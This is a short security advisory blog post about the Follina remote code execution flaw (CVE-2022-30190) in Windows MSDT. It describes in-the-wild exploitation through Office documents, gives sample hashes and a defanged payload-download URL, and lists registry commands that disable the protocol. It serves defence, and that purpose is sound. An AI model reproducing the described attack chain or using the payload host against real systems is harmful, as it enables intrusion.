<span class="rt-reading-time" style="display: block;"><span class="rt-label">Estimated reading time: </span><span class="rt-time">2</span><span class="rt-label"> minutes</span></span><p>A Zero-day Remote Code Execution Vulnerability with high severity has been identified as CVE-2022-30190 “FOLLINA” in Microsoft Windows Support Diagnostic Tool (MSDT).</p>
<p>MSDT is a tool present on Windows version 7 and above and is used for diagnosis of problems in applications such as Ms Office Documents when any user reports problem to Microsoft support.</p>
<h3><strong>Why is CVE-2022-30190 “Follina” vulnerability so dangerous?</strong></h3>
<p>This diagnostic tool (MSDT) is usually called by applications such as Ms Office Documents which allows remote code execution with the privileges of the calling process when called via MSDT URL Protocol. An attacker can exploit this vulnerability to run any arbitrary code.</p>
<p>This vulnerability has been exploited in wild with the use of Ms Office Documents distributed via email to execute malicious payloads (For ex: Turian Backdoor, Cobalt Strike etc.). Initially a doc sample named as VIP Invitation to Doha Expo 2023.docx (7c4ee39de1b67937a26c9bc1a7e5128b) used webdav to download CobaltStrike.</p>
<p>Chinese APT group &#8216;TA413&#8217; have exploited this Vulnerability in wild which download backdoor as payload via MSDT URL Protocol.</p>
<p><strong>Below figure shows the base64 encoded html file downloaded by DOC(SHA: </strong><strong>000c10fef5a643bd96da7cf3155e6a38)</strong><strong> from hxxp://212[.]138.130.8/analysis [.]html</strong></p>

<p><strong>Following figure shows the decoded data:</strong></p>
<p><img class="size-full wp-image-5238 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2022/06/Picture2.png" alt="" width="602" height="170" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/06/Picture2.png 602w, https://www.seqrite.com/blog/wp-content/uploads/2022/06/Picture2-300x85.png 300w" sizes="(max-width: 602px) 100vw, 602px" /></p>
<p>When we decoded base64 encoded data it can be clearly seen that svchosts.exe which is the backdoor is downloaded via MSDT URL PROTOCOL</p>
<h3><strong>Mitigation of “Follina”</strong></h3>
<p><strong> </strong>Disabling MSDT URL protocol:</p>
<ol>
<li>Execute the following command as Administrator to back up the registry key –</li>
</ol>
<p>“reg export HKEY_CLASSES_ROOT\ms-msdt filename“</p>
<ol start="2">
<li>To delete the registry key, execute the command “reg delete HKEY_CLASSES_ROOT\ms-msdt /f”.</li>
</ol>
<p>For restoring the registry key execute the following command as Administrator – “reg import filename”</p>
